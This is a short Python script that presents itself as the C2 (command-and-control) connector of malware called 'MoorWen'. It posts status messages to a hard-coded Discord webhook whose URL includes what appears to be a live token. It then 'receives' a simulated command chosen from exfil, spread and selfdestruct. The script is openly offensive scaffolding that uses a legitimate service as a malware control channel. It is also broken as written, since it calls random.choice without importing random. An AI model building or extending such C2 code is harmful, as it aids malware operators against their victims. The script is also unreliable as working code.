# ============================================================
# MOORWEN — C2 CONNECTOR
# ============================================================

import requests
import json

webhook = "https://discord.com/api/webhooks/1541184615719374990/ij1wnF8bf0CULSDYZKUyIEkWWKn7whlClnq9fMa8vGHHEPVanQyUn8WwIiXogfHsx3go"

def send_status(status):
    payload = {"content": f"[+] MoorWen C2: {status}"}
    requests.post(webhook, json=payload)

def receive_command():
    # Simulated command retrieval
    commands = ["exfil", "spread", "selfdestruct"]
    return random.choice(commands)

send_status("MoorWen C2 online.")
command = receive_command()
print(f"[*] Command received: {command}")
